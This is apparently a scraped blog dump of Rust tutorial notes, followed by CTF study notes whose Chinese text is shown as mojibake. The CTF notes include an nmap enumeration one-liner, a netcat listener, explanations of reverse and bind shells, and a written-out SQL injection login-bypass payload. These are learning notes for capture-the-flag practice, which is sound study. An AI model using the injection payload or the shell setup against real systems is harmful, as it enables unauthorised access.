&#123; let some_u8_value = Some(0u8); if let Some(3) = some_u8_value &#123; println!(\"three\"); &#125;&#125; 123456789fn main() &#123; let coin = Coin::Penny; let mut count = 0; if let Coin::Quarter(state) = coin &#123; println!(\"State quarter from &#123;:?&#125;!\", state); &#125; else &#123; count += 1; &#125;&#125; 123456789fn main() &#123; let coin = Coin::Penny; let mut count = 0; match coin &#123; Coin::Quarter(state) =&gt; println!(\"State quarter from &#123;:?&#125;!\", state), _ =&gt; count += 1, &#125;&#125; packages&gt;crates&gt;modules A package isone or more cratesthat provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.A package must contain zero or one library crates, and no more. It can contain as many binary crates as youâ€™d like, but it must contain at least one crate (either library or binary).If a package contains src/main.rs and src/lib.rs, it has two crates: a library and a binary, both with the same name as the package.A package canhave multiple binary crates by placing files in the src/bin directory:each file will be a separate binary crate. the use keyword that brings a path into scope; and the pub keyword to make items public. Weâ€™ll also discuss the as keyword, external packages, and the glob operator Modules let us organize code within a crate into groups Create a new library named restaurant by running cargo new --librestaurant;crate //implicit module src/main.rs and src/lib.rs äº§ç”Ÿ â””â”€â”€ front_of_house â”œâ”€â”€ hosting â”‚ â”œâ”€â”€ add_to_waitlist â”‚ â””â”€â”€ seat_at_table â””â”€â”€ serving â”œâ”€â”€ take_order â”œâ”€â”€ serve_order â””â”€â”€ take_payment If we want to call a function, we need to know its path.A path can take two forms: An absolute path starts from a crate root by using a crate name or a literal crate.A relative pathstarts from the current module and uses self, super, or an identifier in the current module.Both absolute and relative paths are followed by one or more identifiers separated by double colons (::). 12345678910111213mod front_of_house &#123; mod hosting &#123; fn add_to_waitlist() &#123;&#125; &#125;&#125;pub fn eat_at_restaurant() &#123; // Absolute path crate::front_of_house::hosting::add_to_waitlist(); // Relative path front_of_house::hosting::add_to_waitlist();&#125; The way privacy works in Rust is that all items (functions, methods, structs, enums, modules, and constants) are private by default. 12345678910111213141516171819202122232425mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; //making the module public doesnâ€™t make its contents public. &#125;&#125;pub fn eat_at_restaurant() &#123; // Absolute path crate::front_of_house::hosting::add_to_waitlist(); // Relative path front_of_house::hosting::add_to_waitlist();&#125;fn serve_order() &#123;&#125;mod back_of_house &#123; fn fix_incorrect_order() &#123; cook_order(); super::serve_order(); &#125; fn cook_order() &#123;&#125;&#125; Enums arenâ€™t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the default for enum variants is to be public.Structs are often useful without their fields being public, so struct fields follow the general rule of everything being private by default unless annotated with pub. 123456789101112131415161718192021222324252627282930usemod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;use crate::front_of_house::hosting;pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;use self::front_of_house::hosting;pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;fn main() &#123;&#125; asThereâ€™s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify as and a new local name, or alias, for the type. 123456789101112131415![allow(unused_variables)]fn main() &#123;use std::fmt::Result;use std::io::Result as IoResult;fn function1() -&gt; Result &#123; // --snip-- Ok(())&#125;fn function2() -&gt; IoResult&lt;()&gt; &#123; // --snip-- Ok(())&#125;&#125; this technique is called re-exporting because weâ€™re bringing an item into scope but also making that item available for others to bring into their scope12345678910111213141516171819mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;pub use crate::front_of_house::hosting; //å…¶ä»–å¯ä»¥ å¦å¤–åˆ›ç«‹ä¸€ä¸ªé“¾æ¥pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;fn main() &#123;&#125;fn main() &#123;use std::collections::HashMap;&#125; This is an absolute path starting with std, the name of the standard library crate. 123456789101112131415use rand::Rng;// --snip--use std::&#123;cmp::Ordering, io&#125;;// --snip--fn main() &#123;use std::io::&#123;self, Write&#125;;&#125;#![allow(unused_variables)]fn main() &#123;use std::collections::*;&#125; brings all public items The mod keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module. vector12345678910111213141516171819202122fn main() &#123; let v: Vec&lt;i32&gt; = Vec::new();&#125;fn main() &#123; let v = vec![1, 2, 3]; //ç±»åˆ«è‡ªå·±æ¨æµ‹&#125;fn main() &#123; let mut v = Vec::new(); v.push(5); v.push(6); v.push(7); v.push(8);&#125;fn main() &#123; &#123; let v = vec![1, 2, 3, 4]; // do stuff with v &#125; // &lt;- v goes out of scope and is freed here&#125; 1234567891011fn main() &#123; let v = vec![1, 2, 3, 4, 5]; let third: &amp;i32 = &amp;v[2]; println!(\"The third element is &#123;&#125;\", third); match v.get(2) &#123; //gives us an Option&lt;&amp;T&gt;. Some(third) =&gt; println!(\"The third element is &#123;&#125;\", third), None =&gt; println!(\"There is no third element.\"), &#125;&#125; 123456fn main() &#123; let mut v = vec![100, 32, 57]; for i in &amp;mut v &#123; *i += 50; //è§£å¼•ç”¨ dereference operator (*) to get to the value in i &#125;&#125; 12345678910111213fn main() &#123; enum SpreadsheetCell &#123; Int(i32), Float(f64), Text(String), &#125; let row = vec![ //vecç±»å‹ä¸ºSpreadsheetCell å®é™…ä¸Šå­˜å‚¨ä¸åŒç±»å‹å€¼ SpreadsheetCell::Int(3), SpreadsheetCell::Text(String::from(\"blue\")), SpreadsheetCell::Float(10.12), ];&#125; æšä¸¾è¦é…åˆmatchä½¿ç”¨ stringRemember thatstrings are UTF-8encoded,1234567891011121314151617181920212223fn main() &#123; let hello = String::from(\"Ø§Ù„Ø³Ù„Ø§Ù… Ø¹Ù„ÙŠÙƒÙ…\"); let hello = String::from(\"DobrÃ½ den\"); let hello = String::from(\"Hello\"); let hello = String::from(\"×©Ö¸××œ×•Ö¹×\"); let hello = String::from(\"à¤¨à¤®à¤¸à¥à¤¤à¥‡\"); let hello = String::from(\"ã“ã‚“ã«ã¡ã¯\"); let hello = String::from(\"ì•ˆë…•í•˜ì„¸ìš”\"); let hello = String::from(\"ä½ å¥½\"); let hello = String::from(\"OlÃ¡\"); let hello = String::from(\"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ\"); let hello = String::from(\"Hola\");&#125;fn main() &#123; let mut s = String::from(\"foo\"); s.push_str(\"bar\");&#125;fn main() &#123; let mut s = String::from(\"lo\"); s.push('l');&#125; push method takesa single character 12345fn main() &#123; let s1 = String::from(\"Hello, \"); let s2 = String::from(\"world!\"); let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add call and no longer be valid after that.&#125; add is that the compiler can coerce the &amp;String argument into a &amp;str format1234567fn main() &#123; let s1 = String::from(\"tic\"); let s2 = String::from(\"tac\"); let s3 = String::from(\"toe\"); let s = format!(\"&#123;&#125;-&#123;&#125;-&#123;&#125;\", s1, s2, s3); //doesnâ€™t take ownership of any of its parameters.&#125; utf-8å¯å˜å­—èŠ‚ 1-4å­—èŠ‚ï¼Œæœ‰äº›ä¸€ä¸ªå­—èŠ‚ æœ‰äº›4ä¸ªå­—èŠ‚ 123456[allow(unused_variables)]fn main() &#123;let hello = \"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ\";let s = &amp;hello[0..4];&#125; 123456#![allow(unused_variables)]fn main() &#123;for c in \"à¤¨à¤®à¤¸à¥à¤¤à¥‡\".chars() &#123; println!(\"&#123;&#125;\", c);&#125;&#125; 123456#![allow(unused_variables)]fn main() &#123;for b in \"à¤¨à¤®à¤¸à¥à¤¤à¥‡\".bytes() &#123; // returns each raw byte, println!(\"&#123;&#125;\", b);&#125;&#125; hashmapall of the keys must have thesame type, and all of thevaluesmust have thesame type.123456fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(String::from(\"Blue\"), 10); scores.insert(String::from(\"Yellow\"), 50);&#125; 123456789fn main() &#123; use std::collections::HashMap; let teams = vec![String::from(\"Blue\"), String::from(\"Yellow\")]; let initial_scores = vec![10, 50]; let mut scores: HashMap&lt;_, _&gt; = teams.into_iter().zip(initial_scores.into_iter()).collect();&#125; zipmethod to create a vector of tuplescollectmethod to turn that vector of tuples into a hash map, For types that implement the Copy trait, like i32, the valuesare copied into the hash map. For owned values like String, the values will be moved and the hash map will be the owner of those values 1234567891011fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(String::from(\"Blue\"), 10); scores.insert(String::from(\"Yellow\"), 50); let team_name = String::from(\"Blue\"); let score = scores.get(&amp;team_name);&#125; Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;no value get will return None. for (key, value) in &amp;scores { println!(&quot;{}: {}&quot;, key, value); } 123456789101112fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(String::from(\"Blue\"), 10); scores.entry(String::from(\"Yellow\")).or_insert(50); //entryæ£€æŸ¥å€¼æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›Entryï¼Œ or_insertæ˜¯Entryçš„æ–¹æ³• return a mutable reference to the value æ²¡æœ‰å€¼æ’å…¥ scores.entry(String::from(\"Blue\")).or_insert(50); println!(\"&#123;:?&#125;\", scores); //&#123;\"Yellow\": 50, \"Blue\": 10&#125;&#125; 1234567891011121314fn main() &#123; use std::collections::HashMap; let text = \"hello world wonderful world\"; let mut map = HashMap::new(); for word in text.split_whitespace() &#123; let count = map.entry(word).or_insert(0); //or_insert method actually returns a mutable reference (&amp;mut V) æ‰€ä»¥å¯ä»¥åŠ 1 *count += 1; &#125; println!(\"&#123;:?&#125;\", map);&#125;","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUSTå­¦ä¹ 2","slug":"RUSTå­¦ä¹ 2","date":"2020-07-29T01:33:06.000Z","updated":"2020-07-29T01:34:09.636Z","comments":true,"path":"2020/07/29/RUSTå­¦ä¹ 2/","link":"","permalink":"http://finsenty54.github.io/2020/07/29/RUSTå­¦ä¹ 2/","excerpt":"rustAll data stored on the stack must have a known, fixed size.Data with an unknown size at compile time or a size that might change must be stored on the heap instead. Pushing tothe stack is faster than allocating on the heap because the allocator never has to search for a place to store new data;","text":"rustAll data stored on the stack must have a known, fixed size.Data with an unknown size at compile time or a size that might change must be stored on the heap instead. Pushing tothe stack is faster than allocating on the heap because the allocator never has to search for a place to store new data; Ownership Rulesè§£å†³å †ä¸Šæ•°æ® çš„é—®é¢˜ Each value in Rust has a variable thatâ€™s called its owner.There can only be one owner at a time.When the owner goes out of scope,the value will be dropped. ä»å †ä¸­å›æ”¶ string å­˜åœ¨scopeä¸­ the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. rust1234let s1 = String::from(\"hello\"); | -- move occurs because `s1` has type `std::string::String`, which does not implement the `Copy` trait3 | let s2 = s1; | -- value moved here s1 æ— æ•ˆ å›æ”¶åªs2 123456fn main() &#123; let s1 = String::from(\"hello\"); let s2 = s1.clone(); println!(\"s1 = &#123;&#125;, s2 = &#123;&#125;\", s1, s2);&#125; 12x=5y=x æ ˆä¸­ä¸ç”¨clone123456789101112131415fn main() &#123; let s = String::from(\"hello\"); // s comes into scope takes_ownership(s); // s's value moves into the function... // ... and so is no longer valid here let x = 5; // x comes into scope makes_copy(x); // x would move into the function, // but i32 is Copy, so itâ€™s okay to still // use x afterward&#125; // Here, x goes out of scope, then s. But because s's value was moved, nothing // special happens. References and Borrowingå¼•ç”¨ ä¸æ‹¿æ‰€æœ‰æƒ ä¹Ÿç§°å€Ÿ12345fn main() &#123; let mut s = String::from(\"hello\"); change(&amp;mut s);&#125; 123fn change(some_string: &amp;mut String) &#123; some_string.push_str(\", world\");&#125; ä¸€ä¸ªå¯å˜å˜é‡åªèƒ½å¼•ç”¨ä¸€æ¬¡123456789fn main() &#123; let mut s = String::from(\"hello\"); &#123; let r1 = &amp;mut s; &#125; // r1 goes out of scope here, so we can make a new reference with no problems. let r2 = &amp;mut s;&#125; ç”¨èŠ±æ‹¬å·åˆ›å»ºä¸€ä¸ªç©ºé—´ï¼Œæ¥å¼•ç”¨ï¼Œ We also cannot have a mutable reference while we have an immutable one.å¯å˜å˜é‡æœ‰ä¸å˜å¼•ç”¨åï¼Œä¸èƒ½åˆ›å»ºå¯å˜å¼•ç”¨ 1234567891011fn main() &#123; let mut s = String::from(\"hello\"); let r1 = &amp;s; // no problem let r2 = &amp;s; // no problem println!(\"&#123;&#125; and &#123;&#125;\", r1, r2); // r1 and r2 are no longer used after this point let r3 = &amp;mut s; // no problem println!(\"&#123;&#125;\", r3);&#125; å¼•ç”¨èŒƒå›´ä»åˆ›å»ºåˆ°æœ€åä¸€æ¬¡ä½¿ç”¨å…³é”®æ˜¯ä¸é‡å  1234567891011fn main() &#123; let reference_to_nothing = dangle();&#125;fn dangle() -&gt; &amp;String &#123; // dangle returns a reference to a String let s = String::from(\"hello\"); // s is a new String &amp;s // we return a reference to the String, s&#125; // Here, s goes out of scope, and is dropped. Its memory goes away. // Danger! slice1234567891011fn first_word(s: &amp;String) -&gt; usize &#123; let bytes = s.as_bytes(); for (i, &amp;item) in bytes.iter().enumerate() &#123; if item == b' ' &#123; return i; &#125; &#125; s.len()&#125; iteris a method that returns each element in a collectionenumerate wraps the result of iter and returns each element as part of a tuple instead.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç´¢å¼•å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯å€¼çš„å¼•ç”¨ 123456fn main() &#123; let s = String::from(\"hello world\"); let hello = &amp;s[0..5]; //0å¯ä»¥çœå» let world = &amp;s[6..11]; å­˜6-10&#125; string slices12345678fn main() &#123;let s = String::from(\"hello\");let len = s.len();let slice = &amp;s[3..len];let slice = &amp;s[3..]; //ç›¸åŒ&#125; The type that signifies â€œstring sliceâ€ is written as &amp;str:1234567891011fn first_word(s: &amp;String) -&gt; &amp;str &#123; let bytes = s.as_bytes(); for (i, &amp;item) in bytes.iter().enumerate() &#123; if item == b' ' &#123; return &amp;s[0..i]; &#125; &#125; &amp;s[..]&#125; String Literals Are Sliceså›ºå®šå­—ç¬¦ä¸²å°±æ˜¯ä¸€ç§åˆ‡ç‰‡The type of s here is &amp;stritâ€™s a slice pointing to that specific point of the binary fn first_word(s: &amp;str) -&gt; &amp;str {å¯ä»¥æ¥å—&amp;String å’Œ &amp;str //String å’Œ å­—ç¬¦ä¸² å¦‚â€œhelloâ€ 12345fn main() &#123;let a = [1, 2, 3, 4, 5];let slice = &amp;a[1..3];&#125; structç»“æ„ä½“å­—æ®µé‡Œéƒ½æ˜¯å¯å˜çš„12345678910111213141516171819202122struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;fn main() &#123; let user1 = User &#123; email: String::from(\"someone@example.com\"), username: String::from(\"someusername123\"), active: true, sign_in_count: 1, &#125;;&#125; é¡ºåºéšä¾¿123456struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125; 12345678fn build_user(email: String, username: String) -&gt; User &#123; //è¿”å›struct å®ä¾‹ User &#123; email: email, username: username, active: true, sign_in_count: 1, &#125;&#125; 123456fn main() &#123; let user1 = build_user( String::from(\"someone@example.com\"), String::from(\"someusername123\"), );&#125; 12345678fn build_user(email: String, username: String) -&gt; User &#123; User &#123; email, //çœç•¥rather than email: email. username, active: true, sign_in_count: 1, &#125;&#125; æ›´æ–°èµ‹äºˆå¦ä¸€å®ä¾‹123456789101112131415161718192021struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;fn main() &#123; let user1 = User &#123; email: String::from(\"someone@example.com\"), username: String::from(\"someusername123\"), active: true, sign_in_count: 1, &#125;; let user2 = User &#123; email: String::from(\"another@example.com\"), username: String::from(\"anotherusername567\"), ..user1 // .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance. &#125;;&#125; tuple struct1234567fn main() &#123; struct Color(i32, i32, i32); struct Point(i32, i32, i32); let black = Color(0, 0, 0); let origin = Point(0, 0, 0);&#125; åšç½‘ç«™æ–‡ä»¶è·¯å¾„çš„ä¸€äº›é€šç”¨è§„åˆ™ï¼š è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä¸ HTML æ–‡ä»¶åŒçº§ï¼Œåªéœ€ç›´æ¥ä½¿ç”¨æ–‡ä»¶åï¼Œæ¯”å¦‚ my-image.jpgã€‚è¦å¼•ç”¨å­æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œè¦åœ¨è·¯å¾„å‰å†™ä¸‹ç›®å½•åå¹¶åŠ ä¸€ä¸ªæ–œæ ï¼Œæ¯”å¦‚ subdirectory/my-image.jpgã€‚è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä½äº HTML æ–‡ä»¶çš„ä¸Šçº§ï¼Œéœ€è¦åŠ ä¸Šä¸¤ä¸ªç‚¹ã€‚æ¯”å¦‚ï¼Œå¦‚æœ index.html åœ¨ test-site ä¸‹é¢çš„ä¸€ä¸ªå­ç›®å½•è€Œ my-image.png åœ¨ test-site ç›®å½•ï¼Œä½ å¯ä»¥åœ¨ index.html é‡Œä½¿ç”¨ ../my-image.png å¼•ç”¨ my-image.pngã€‚ä»¥ä¸Šæ–¹æ³•å¯ä»¥éšæ„ç»„åˆï¼Œæ¯”å¦‚ ../subdirectory/another-subdirectory/my-image.pngã€‚","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUSTå­¦ä¹ 1","slug":"RUSTå­¦ä¹ 1","date":"2020-07-27T07:38:11.000Z","updated":"2020-07-27T07:50:07.327Z","comments":true,"path":"2020/07/27/RUSTå­¦ä¹ 1/","link":"","permalink":"http://finsenty54.github.io/2020/07/27/RUSTå­¦ä¹ 1/","excerpt":"è¿è¡Œå‘½ä»¤cargo doc --openrustup doccargo new --vcs=gitcargo buildcargo runcargo checkæ›´å¿«ç¼–è¯‘ï¼Œä½†ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶cargo build --release ç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ›´å¿«benchmarkåŸºå‡†æµ‹è¯•","text":"è¿è¡Œå‘½ä»¤cargo doc --openrustup doccargo new --vcs=gitcargo buildcargo runcargo checkæ›´å¿«ç¼–è¯‘ï¼Œä½†ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶cargo build --release ç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ›´å¿«benchmarkåŸºå‡†æµ‹è¯•Variables and Mutabilitymutable æ˜“å˜çš„ let mut x=5 rusté»˜è®¤å˜é‡ä¸å¯å˜fn main() {const MAX_POINTS: u32 = 100_000;}const æ•´ä¸ªè¿è¡Œæ—¶é—´éƒ½å­˜åœ¨ fn main() { let spaces = â€œ â€œ; let spaces = spaces.len();} Data Typesinterger é»˜è®¤i32float é»˜è®¤ f64char â€˜â€™ 4å­—èŠ‚Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. string â€œâ€ tuple å…ƒç»„ å›ºå®š ç±»å‹å¯ä»¥ä¸åŒ123456789101112fn main() &#123; let tup: (i32, f64, u8) = (500, 6.4, 1);&#125;fn main() &#123; let x: (i32, f64, u8) = (500, 6.4, 1); let five_hundred = x.0; let six_point_four = x.1; let one = x.2;&#125; array æ•°ç»„ ç±»å‹ç›¸åŒ å›ºå®š å­˜åœ¨æ ˆä¸­123fn main() &#123; let a = [1, 2, 3, 4, 5];&#125; 1234fn main() &#123;let months = [\"January\", \"February\", \"March\", \"April\", \"May\", \"June\", \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"];&#125; 123456789fn main() &#123;let a: [i32; 5] = [1, 2, 3, 4, 5];&#125;fn main() &#123;let a = [3; 5];&#125;let first = a[0]; rustä¼šæ£€æŸ¥ç´¢å¼•è·ƒå‡º vector ä¸å›ºå®š Functions123456789fn main() &#123; println!(\"Hello, world!\"); another_function();&#125;fn another_function() &#123; println!(\"Another function.\");&#125; Rustdoesnâ€™t carewhere you define your functions, only that theyâ€™re defined somewhere. 123456789fn main() &#123; another_function(5, 6);&#125;fn another_function(x: i32, y: i32) &#123; println!(\"The value of x is: &#123;&#125;\", x); println!(\"The value of y is: &#123;&#125;\", y);&#125; å¿…é¡»å£°æ˜å‚æ•°ç±»å‹ Statementsare instructions that perform some action and do not return a value.let y = 6; æ— è¿”å›å€¼ä¸èƒ½èµ‹ç»™å…¶ä»–å˜é‡Expressions evaluate to a resulting value. 12345678910fn main() &#123; let x = 5; let y = &#123; let x = 3; x + 1 &#125;; println!(\"The value of y is: &#123;&#125;\", y);&#125; Note the x + 1 line without a semicolon at the end, which is unlike most of the lines youâ€™ve seen so far. Expressions do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value. è¿”å›å€¼123456789fn five() -&gt; i32 &#123; 5&#125;fn main() &#123; let x = five(); println!(\"The value of x is: &#123;&#125;\", x);&#125; 123456789fn main() &#123; let x = plus_one(5); println!(\"The value of x is: &#123;&#125;\", x);&#125;fn plus_one(x: i32) -&gt; i32 &#123; x + 1;&#125; Comments// control123456789fn main() &#123; let number = 3; if number &lt; 5 &#123; println!(\"condition was true\"); &#125; else &#123; println!(\"condition was false\"); &#125;&#125; Rust will not automatically try to convert non-Boolean types to a Boolean 12345678910111213fn main() &#123; let number = 6; if number % 4 == 0 &#123; println!(\"number is divisible by 4\"); &#125; else if number % 3 == 0 &#123; println!(\"number is divisible by 3\"); &#125; else if number % 2 == 0 &#123; println!(\"number is divisible by 2\"); &#125; else &#123; println!(\"number is not divisible by 4, 3, or 2\"); &#125;&#125; 123456fn main() &#123; let condition = true; let number = if condition &#123; 5 &#125; else &#123; 6 &#125;; println!(\"The value of number is: &#123;&#125;\", number);&#125; å¾ªç¯12345678910111213141516171819fn main() &#123; loop &#123; println!(\"again!\"); &#125;&#125;fn main() &#123; let mut counter = 0; let result = loop &#123; counter += 1; if counter == 10 &#123; break counter * 2; &#125; &#125;; println!(\"The result is &#123;&#125;\", result);&#125; while1234567891011fn main() &#123; let mut number = 3; while number != 0 &#123; println!(\"&#123;&#125;!\", number); number -= 1; &#125; println!(\"LIFTOFF!!!\");&#125; for use a for loop and execute some code for each item in a collection1234567fn main() &#123; let a = [10, 20, 30, 40, 50]; for element in a.iter() &#123; println!(\"the value is: &#123;&#125;\", element); &#125;&#125; 123456fn main() &#123; for number in (1..4).rev() &#123; println!(\"&#123;&#125;!\", number); &#125; println!(\"LIFTOFF!!!\");&#125; rev, to reverse the range guess game . example123456fn main() &#123;let x = 5;let y = 10;println!(\"x = &#123;&#125; and y = &#123;&#125;\", x, y);&#125; cargo doc --open The trim method on a String instance will eliminate any whitespace at the beginning and end5\\n å˜æˆ 5The parse method on strings parses a string into some kind of number. cargo fmt è‡ªåŠ¨è°ƒæ•´æ ¼å¼https://github.com/rust-lang/rustfmt","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"CTFå…¥é—¨ WECALL4+hackthebox-REVERSE","slug":"CTFå…¥é—¨ WECALL4+hackthebox-REVERSE","date":"2020-07-11T02:37:31.000Z","updated":"2020-07-11T02:40:05.281Z","comments":true,"path":"2020/07/11/CTFå…¥é—¨ WECALL4+hackthebox-REVERSE/","link":"","permalink":"http://finsenty54.github.io/2020/07/11/CTFå…¥é—¨ WECALL4+hackthebox-REVERSE/","excerpt":"wechall register_globalsregister_globals åœ¨php 5.4.0 åè¢«ç§»é™¤ å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆå„ç§å˜é‡ å¦‚htmlè¯·æ±‚å˜é‡http://1.1.1.1/report.asp?id=123&amp;kehu=222login[0]=admin ç›´æ¥login=admin åªå–ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦ hacktheboxinvite challenge æµè§ˆå™¨console ä¸‹è¿è¡Œå‡½æ•° åŠ ï¼ˆï¼‰curl -X POST https://â€¦","text":"wechall register_globalsregister_globals åœ¨php 5.4.0 åè¢«ç§»é™¤ å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆå„ç§å˜é‡ å¦‚htmlè¯·æ±‚å˜é‡http://1.1.1.1/report.asp?id=123&amp;kehu=222login[0]=admin ç›´æ¥login=admin åªå–ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦ hacktheboxinvite challenge æµè§ˆå™¨console ä¸‹è¿è¡Œå‡½æ•° åŠ ï¼ˆï¼‰curl -X POST https://â€¦ hackthebox â€“ Enumerationports=$(nmap -p- â€“min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d â€˜/â€˜ -f 1 | tr â€˜\\nâ€™ â€˜,â€™ | sed s/,$//)nmap -sC -sV -p$ports 10.10.10.27 command 1 | command 2 æŠŠç¬¬ä¸€ä¸ªå‘½ä»¤command 1æ‰§è¡Œçš„ç»“æœä½œä¸ºcommand 2çš„è¾“å…¥ä¼ ç»™command 2-T4 å¯ä»¥åŠ å¿«æ‰§è¡Œé€Ÿåº¦-p- æ‰«ææ‰€æœ‰ç«¯å£-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcutcut Print selected parts of lines from each FILE to standard output.-f æŒ‡å®šç¬¬ä¸€åˆ— -d æŒ‡å®šåˆ—åˆ†éš”ç¬¦ tr å‘½ä»¤ç”¨äºè½¬æ¢æˆ–åˆ é™¤æ–‡ä»¶ä¸­çš„å­—ç¬¦ â€˜\\nâ€™ è½¬æ¢ä¸ºâ€˜ï¼Œâ€™sed â€˜s/regexp/replacement/flagsâ€™.Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.regexpåŒ¹é…æˆåŠŸåç”¨replaceæ›¿ä»£ select IS_SRVROLEMEMBER (â€˜sysadminâ€™) remote code execution (RCE) A reverse shellis a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved. Bind shellBind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machineâ€™s listener which then leads to code or command execution on the server. netcatnc -lvnp 443 ç›‘å¬æ¨¡å¼ 443 å¤–æ¥è¯·æ±‚ ollydbgæ˜¾ç¤ºå½“å‰EIP *æ‰§è¡Œåˆ°å…‰æ ‡ä½ç½® F4F2 æ–­ç‚¹CALL æŠŠæ¥ä¸‹æ¥çš„åœ°å€å…ˆå‹å…¥æ ˆwin å‹å…¥å‚æ•°é€†åº f(a,b) å…ˆå‹b å atest = and ä¸æ”¹å˜æ“ä½œæ•°å€¼ x64dbgfile test.py","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTFå…¥é—¨ WECALL2-æ­£åˆ™","slug":"CTFå…¥é—¨ WECALL2","date":"2020-07-06T05:54:43.000Z","updated":"2020-07-06T06:01:18.207Z","comments":true,"path":"2020/07/06/CTFå…¥é—¨ WECALL2/","link":"","permalink":"http://finsenty54.github.io/2020/07/06/CTFå…¥é—¨ WECALL2/","excerpt":"python3list() ä¸€ä¸ªå­—ç¬¦å­—ç¬¦åˆ† child[a],child[b] = child[b],child[a] äº¤æ¢ä½ç½®","text":"python3list() ä¸€ä¸ªå­—ç¬¦å­—ç¬¦åˆ† child[a],child[b] = child[b],child[a] äº¤æ¢ä½ç½® spilt() æŒ‰ç©ºæ ¼åˆ†int() Training: Crypto - Substitution Ihttp://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/ Training: Crypto - Caesar IIimport syssys.stdout = open(â€˜/root/Documents/CTF_WECALL/results.pyâ€™, mode = â€˜wâ€™,encoding=â€™utf-8â€™) æ‰“å°åˆ°æ–‡ä»¶ä¸­ line breaks. æ¢è¡Œç¬¦ vscode python æ•´æ®µå³ç§» é€‰ä¸­tab python 2 è½¬åˆ° 32to3.py æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ https://deerchao.cn/tutorials/regex/regex.htm wechall mysql 2â€˜ union select 1,â€™adminâ€™ ,md5(â€˜1â€™) from users where username =â€™adminâ€™# ï¼Ÿï¼Ÿå¯ä»¥éšä¾¿é€‰æ‹© wechall WWW-Basicslsof -i:ç«¯å£å· ç”¨äºæŸ¥çœ‹æŸä¸€ç«¯å£çš„å ç”¨æƒ…å†µï¼Œæ¯”å¦‚æŸ¥çœ‹8000ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œlsof -i:8000 nginx -s quitps -ax | grep nginxlsof -i:80ip add","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTFå…¥é—¨ WECALL 2","slug":"CTFå…¥é—¨ WECALL1","date":"2020-05-19T12:03:39.000Z","updated":"2020-05-19T12:07:49.772Z","comments":true,"path":"2020/05/19/CTFå…¥é—¨ WECALL1/","link":"","permalink":"http://finsenty54.github.io/2020/05/19/CTFå…¥é—¨ WECALL1/","excerpt":"ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼ŸPHPæ–‡ä»¶å¯ä»¥åŒ…å«æ–‡æœ¬ï¼ŒHTMLï¼ŒCSSï¼ŒJavaScriptå’ŒPHPä»£ç PHPä»£ç 